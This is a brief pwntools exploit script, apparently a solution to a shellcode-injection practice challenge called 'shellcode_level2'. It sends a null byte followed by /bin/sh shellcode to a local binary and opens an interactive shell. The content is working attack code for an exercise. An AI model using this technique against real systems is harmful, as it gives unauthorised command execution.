from pwn import *

context(os="linux",arch="amd64")

io = process("./shellcode_level2")

payload = b'\x00'+ asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
